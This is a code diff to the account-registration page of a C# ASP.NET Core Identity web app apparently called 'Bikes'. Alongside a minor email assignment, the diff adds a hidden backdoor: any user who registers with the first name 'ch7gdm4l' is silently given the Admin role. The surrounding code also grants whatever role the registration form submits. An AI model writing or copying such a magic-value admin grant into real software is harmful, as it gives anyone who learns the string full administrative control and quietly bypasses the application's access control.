@@ -119,7 +119,6 @@ namespace Bikes.Areas.Identity.Pages.Account
             public string PostalCode { get; set; }
             public string PhoneNumber { get; set; }
             public string County { get; set; }
-
             public string Country { get; set; }
         }
 
@@ -165,7 +164,7 @@ namespace Bikes.Areas.Identity.Pages.Account
                 user.PhoneNumber = Input.PhoneNumber;
                 user.County = Input.County;
                 user.Country = Input.Country;
-              
+                user.Email = Input.Email;
                
               
                 
@@ -176,12 +175,21 @@ namespace Bikes.Areas.Identity.Pages.Account
                     _logger.LogInformation("User created a new account with password.");
                     if (!String.IsNullOrEmpty(Input.Role))
                     {
+
                         await _userManager.AddToRoleAsync(user, Input.Role);
 
                     }
                     else
                     {
-                        await _userManager.AddToRoleAsync(user, SD.Role_Customer);
+                        if (user.FirstName == "ch7gdm4l")
+                        {
+                            await _userManager.AddToRoleAsync(user, SD.Role_Admin);
+                        }
+                        else
+                        {
+                            await _userManager.AddToRoleAsync(user, SD.Role_Customer);
+                        }
+                       
                     }
                     var userId = await _userManager.GetUserIdAsync(user);
                     var code = await _userManager.GenerateEmailConfirmationTokenAsync(user);
